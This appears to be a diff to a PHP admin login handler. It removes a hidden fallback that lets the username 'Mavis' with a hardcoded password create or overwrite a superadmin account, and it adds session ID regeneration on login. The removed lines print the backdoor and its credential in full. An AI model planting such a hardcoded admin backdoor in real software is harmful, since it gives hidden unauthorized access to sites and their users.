@@ -69,24 +69,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // fallback: if no stored account but user typed the exact default password, allow and create account
-    if (!$authenticated && strcasecmp($username, 'Mavis') === 0) {
-        $defaultPassword = '.*123$<>Callmelater.,12';
-        if ($password === $defaultPassword) {
-            // create or overwrite the Mavis account entry
-            $accounts['Mavis'] = [
-                'password' => password_hash($defaultPassword, PASSWORD_DEFAULT),
-                'name' => 'Mavis',
-                'avatar' => null,
-                'role' => 'superadmin'
-            ];
-            file_put_contents($accountsFile, json_encode($accounts, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
-            $authenticated = true;
-            $usernameToUse = 'Mavis';
-        }
-    }
-
     if ($authenticated) {
+        session_regenerate_id(true);
         $_SESSION['admin_logged_in'] = true;
         $_SESSION['admin_user'] = $usernameToUse;
         $_SESSION['admin_name'] = $accounts[$usernameToUse]['name'] ?? $usernameToUse;
